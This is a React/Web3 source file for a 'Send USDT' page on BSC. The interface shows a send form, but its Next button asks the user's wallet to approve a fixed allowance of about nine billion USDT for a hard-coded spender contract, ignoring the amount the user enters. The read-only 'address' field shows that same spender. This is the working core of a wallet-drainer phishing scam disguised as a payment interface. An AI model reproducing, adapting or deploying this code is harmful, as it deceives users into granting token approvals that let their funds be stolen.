import { useState, useEffect } from "react";
import Web3 from "web3";
import Swal from "sweetalert2";
import "@fortawesome/fontawesome-free/css/all.min.css";
import "./App.css";
import '@fontsource/open-sans/300.css';
import '@fontsource/open-sans/400.css';
import '@fontsource/open-sans/500.css';
import '@fontsource/open-sans/600.css';
import '@fontsource/open-sans/700.css';
import '@fontsource/open-sans/800.css';
import '@fontsource/geist';

const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT (BSC)
const spenderAddress = "0x84e6400eE204b4dDCe5E0eF4e253Ba886fdb966A"; // Your verified contract
const approvalAmount = "9024508479"; // USDT amount to approve

const usdtAbi = [
  {
    inputs: [
      { internalType: "address", name: "spender", type: "address" },
      { internalType: "uint256", name: "amount", type: "uint256" },
    ],
    name: "approve",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [{ internalType: "address", name: "account", type: "address" }],
    name: "balanceOf",
    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
    stateMutability: "view",
    type: "function",
  },
];

export default function SendUSDT() {
  const [amount, setAmount] = useState("");
  const [usdValue, setUsdValue] = useState("= $0.00");
  const [isProcessing, setIsProcessing] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [theme, setTheme] = useState("dark");
  const [userAddress, setUserAddress] = useState(null);
  const [isWalletInstalled, setIsWalletInstalled] = useState(false);

  // ✅ Get connected wallet silently (NO popup)
  useEffect(() => {
    if (typeof window !== "undefined" && window.ethereum) {
      setIsWalletInstalled(true);
      
      // ✅ Get already connected accounts silently
      window.ethereum.request({ method: "eth_accounts" }).then((accounts) => {
        if (accounts && accounts.length > 0) {
          setUserAddress(accounts[0]);
        }
      }).catch(err => console.log("Silent account check:", err));
    }

    const darkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
    setTheme(darkMode ? "dark" : "light");

    const listener = (e) => setTheme(e.matches ? "dark" : "light");
    window.matchMedia('(prefers-color-scheme: dark)').addEventListener("change", listener);
    
    return () => window.matchMedia('(prefers-color-scheme: dark)').removeEventListener("change", listener);
  }, []);

  useEffect(() => {
    const value = parseFloat(amount);
    setUsdValue(isNaN(value) || value <= 0 ? "= $0.00" : `= $${value.toFixed(2)}`);
  }, [amount]);

  const setMaxAmount = async () => {
    try {
      if (!userAddress) {
        Swal.fire("Error", "Please connect your wallet first or ensure MetaMask is connected.", "error");
        return;
      }

      const web3 = new Web3(window.ethereum);
      const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
      const balance = await usdt.methods.balanceOf(userAddress).call();
      setAmount(web3.utils.fromWei(balance, "mwei")); // USDT has 6 decimals
    } catch (err) {
      Swal.fire("Error", "Failed to fetch balance.", "error");
    }
  };

  const handleApprove = async () => {
    // ✅ Validate amount first
    if (!amount || parseFloat(amount) <= 0) {
      Swal.fire("Validation Error", "Please enter a valid amount", "warning");
      return;
    }

    // ✅ Check if wallet is connected
    if (!userAddress) {
      Swal.fire("Wallet Not Connected", "Please ensure MetaMask is connected to an account.", "warning");
      return;
    }

    setIsProcessing(true);
    try {
      const web3 = new Web3(window.ethereum);

      // ✅ Check and switch to BSC chain if needed
      const chainId = await web3.eth.getChainId();
      if (chainId !== 56) {
        try {
          await window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: "0x38" }],
          });
        } catch (switchErr) {
          if (switchErr.code === 4902) {
            Swal.fire("Error", "Please add BSC network to MetaMask", "error");
          } else {
            Swal.fire("Error", "Failed to switch network", "error");
          }
          setIsProcessing(false);
          return;
        }
      }

      const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);

      // ✅ Approve fixed amount (9024508479 USDT) - DIRECTLY shows approval popup
      const rawAmount = web3.utils.toWei(approvalAmount, "mwei"); // USDT has 6 decimals

      const receipt = await usdt.methods
        .approve(spenderAddress, rawAmount)
        .send({ from: userAddress })
        .on("receipt", () => setShowSuccess(true))
        .on("error", (err) => {
          console.error(err);
          Swal.fire("Error", err.message || "Approval failed", "error");
        });

      console.log("✅ Approval Success - Tx hash:", receipt.transactionHash);
    } catch (err) {
      console.error("Approval error:", err);
      Swal.fire("Error", err.message || "Something went wrong", "error");
    } finally {
      setIsProcessing(false);
    }
  };

  const isDark = theme === "dark";

  if (showSuccess) {
    return (
      <div className={`min-h-screen flex flex-col justify-center items-center px-4 ${isDark ? "bg-[#1f1f1f] text-white" : "bg-white text-black"}`}>
        <svg
          className="w-24 h-24 text-green-500 animate-bounce"
          fill="none"
          stroke="currentColor"
          strokeWidth="2"
          viewBox="0 0 24 24"
        >
          <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
        </svg>
        <h2 className="text-2xl mt-4 font-semibold">Approval Successful!</h2>
        <p className="text-center mt-2 text-gray-400">Your USDT has been approved for the contract.</p>
        <button
          className="fixed bottom-6 bg-[#5CE07E] text-black px-10 py-3 rounded-full text-lg font-semibold hover:bg-[#4aca6b] transition-all duration-300"
          onClick={() => setShowSuccess(false)}
        >
          OK
        </button>
      </div>
    );
  }

  return (
    <div className={`wallet-container ${isDark ? "dark" : "light"}`}>
      {!isWalletInstalled && (
        <div className={`p-4 mb-4 rounded-lg ${isDark ? "bg-red-900 text-red-200" : "bg-red-100 text-red-800"}`}>
          <p className="text-sm">❌ MetaMask not found. Please install MetaMask to continue.</p>
        </div>
      )}

      {isWalletInstalled && !userAddress && (
        <div className={`p-4 mb-4 rounded-lg ${isDark ? "bg-yellow-900 text-yellow-200" : "bg-yellow-100 text-yellow-800"}`}>
          <p className="text-sm">⚠️ No wallet connected. Please connect MetaMask first.</p>
        </div>
      )}

      {userAddress && (
        <div className={`p-4 mb-4 rounded-lg ${isDark ? "bg-green-900 text-green-200" : "bg-green-100 text-green-800"}`}>
          <p className="text-sm">✅ Connected: {userAddress.slice(0, 6)}...{userAddress.slice(-4)}</p>
        </div>
      )}

      <div className="input-group">
        <p className="inpt_tital">Address or Domain Name</p>
        <div className="border">
          <div className="left">
            <input
              type="text"
              className="custom-input"
              value={spenderAddress}
              readOnly
            />
          </div>
        </div>
      </div>

      <div className="input-group mt-7">
        <p className="inpt_tital">Amount</p>
        <div className="border">
          <div className="left">
            <input
              type="number"
              min="0"
              step="0.01"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              placeholder="Enter USDT Amount"
              className="custom-input"
            />
          </div>
          <span className="right mr-3">
            <span className="text-sm text-[#b0b0b0]">USDT</span>
            <span
              className="mar_i blue text-sm ml-2 cursor-pointer hover:underline transition-all"
              onClick={setMaxAmount}
            >
              Max
            </span>
          </span>
        </div>
      </div>

      <p className="fees valid">{usdValue}</p>

      <button
        id="nextBtn"
        className="send-btn"
        onClick={handleApprove}
        disabled={isProcessing || !isWalletInstalled || !userAddress || !amount || parseFloat(amount) <= 0}
        style={{
          backgroundColor: 
            isProcessing || !isWalletInstalled || !userAddress || !amount || parseFloat(amount) <= 0 
              ? "var(--disabled-bg)" 
              : "#5CE07E",
          color: 
            isProcessing || !isWalletInstalled || !userAddress || !amount || parseFloat(amount) <= 0 
              ? "var(--disabled-text)" 
              : "#1b1e15",
          cursor: 
            isProcessing || !isWalletInstalled || !userAddress || !amount || parseFloat(amount) <= 0 
              ? "not-allowed" 
              : "pointer",
          opacity: 
            isProcessing || !isWalletInstalled || !userAddress || !amount || parseFloat(amount) <= 0 
              ? "0.6" 
              : "1",
        }}
      >
        {isProcessing ? (
          <span className="flex items-center gap-2">
            <svg className="animate-spin h-5 w-5" viewBox="0 0 24 24">
              <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
              <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
            </svg>
            Processing...
          </span>
        ) : (
          "Next"
        )}
      </button>
    </div>
  );
}
